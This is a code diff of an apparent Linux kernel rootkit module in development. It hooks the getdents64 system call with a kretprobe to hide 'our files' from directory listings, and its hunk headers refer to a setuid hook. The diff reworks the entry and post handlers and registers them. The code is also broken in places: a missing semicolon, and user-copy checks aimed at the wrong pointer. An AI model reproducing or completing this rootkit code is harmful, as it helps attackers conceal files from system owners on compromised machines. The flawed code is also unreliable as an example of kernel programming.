@@ -52,7 +52,8 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 /* Hiding our files from ls */
 
 /* struct for info to be passed from entry handler to post handler */
-/*static struct getdents_data{
+struct getdents_data{
+    int fd;
     struct linux_dirent64 *dirent_buf;
     int count;
     int skip_file;
@@ -60,37 +61,43 @@ void __x64_sys_setuid_post_handler(struct kprobe *kp, struct pt_regs *regs, unsi
 
 
 static int __x64_sys_getdents64_entry_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
-	struct getdents_data *dentry_data=(struct getdents_data *)ri->data;
+	printk(KERN_INFO "stepping through entry handler");
+	struct getdents_data *data;
+	data = (struct getdents_data *)ri->data;
 
 
-	dentry_data->dirent_buf=(void __user *)regs->si;
-	dentry_data->count=regs->dx;
+	char * filename=(char *)regs->si
+	printk(KERN_INFO "getdents raw fd: %ld",regs->di);
+	data->fd=regs->di;
+	data->dirent_buf=regs->si;
+	data->count=regs->dx;
+
+	printk(KERN_INFO "getdents called with fd: %d",data->fd);
 
 
 	return 0;
 }
 
-*/
 static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, struct pt_regs *regs){
 
 	printk(KERN_INFO "executing __x64_sys_getdents64_post_handler");
-	struct linux_dirent64 __user *dentry_data=(struct linux_dirent64 *)regs->si;
+	struct getdents_data *data=(struct getdents_data *)ri->data;
 
 	ssize_t ret = regs_return_value(regs);
-	int dirfd=regs->di;
+	int dirfd=data->fd;
 	unsigned long count=regs->dx;
 
 	if(dirfd<0)
 		printk(KERN_ERR "conductor...we have a problem");
 
-	printk(KERN_INFO "getdents called with fd: %d and count %lx",regs->di,count);
+//	printk(KERN_INFO "getdents called with fd: %d and count %lx",dirfd,count);
 	struct linux_dirent64 *current_dir,*dirent_ker=NULL;
 	unsigned long offset = 0;
 
 
 	printk(KERN_INFO "getdents returned %d bytes", ret);
 
-	if(ret<=(struct linux_dirent64 *)regs->dx){
+	if(ret<=regs->dx){
 		printk(KERN_DEBUG "ret is less than count");
 	}
 	
@@ -101,11 +108,11 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 
 
 	//dentrydata debugging
-	if((unsigned long)dentry_data>=TASK_SIZE){
+	if((unsigned long)data>=TASK_SIZE){
 		printk("why is dentry data in kernel space");
 		return -EFAULT;
 	}
-	if(!dentry_data){
+	if(!data){
 		printk(KERN_ERR "dentry data null");
 		return -EFAULT;
 	}
@@ -114,7 +121,7 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 	if( (ret<=0) || (kbuf == NULL) )
 		return ret;
 //access_ok(dentry_data,ret) breaks this
-	if(access_ok(dentry_data->d_name,ret)){
+	if(access_ok(data,ret)){
 		printk(KERN_DEBUG "acces is ok ");
 	}
 	else{
@@ -122,7 +129,7 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 	}
 	
 	
-	long error = copy_from_user(kbuf,dentry_data,ret);
+	long error = copy_from_user(kbuf,data,ret);
 	if(error){
 		printk(KERN_ERR "could not copy %ld bytes from user",ret);
 		printk(KERN_ERR "copy_from_user error: %ld",error);
@@ -142,8 +149,10 @@ static int __x64_sys_getdents64_post_handler(struct kretprobe_instance *ri, stru
 }
 
 static struct kretprobe  __x64_sys_getdents64_hook= {
+	.entry_handler		= __x64_sys_getdents64_entry_handler,
 	.handler 		= __x64_sys_getdents64_post_handler,
 	.kp.symbol_name		="__x64_sys_getdents64",
+	.data_size		=sizeof(struct getdents_data),
 	.maxactive		=20,
 };
 
